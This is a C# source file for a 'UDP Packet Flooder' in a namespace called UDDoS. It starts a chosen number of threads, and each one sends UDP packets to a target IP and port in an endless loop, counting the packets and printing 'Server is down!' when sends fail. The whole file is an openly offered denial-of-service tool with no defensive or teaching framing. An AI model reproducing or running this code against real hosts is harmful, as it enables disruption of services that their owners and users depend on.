/*
 *  UDP Packet Flooder
 *
 *  Copyright (C) 2021 MishDotCom <mishdotcomdev@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace UDDoS
{
    class UdpDDoS
    {
        public static int count = 0;

        public static void SendPackage(string ip, int port, int threads)
        {
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    byte[] package = message.data;
                    while(true)
                    {
                        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        try
                        {
                            sock.SendTo(package, ep);
                            count++;
                            Console.WriteLine("udphv/> Pacakge sent through UDP to {0} || Count > " + count.ToString(), ip);
                        }
                        catch(SocketException)
                        {
                            Console.WriteLine("Server is down!");
                        }
                    }
                });
                ths[i].Start();
            }
        }
    }
}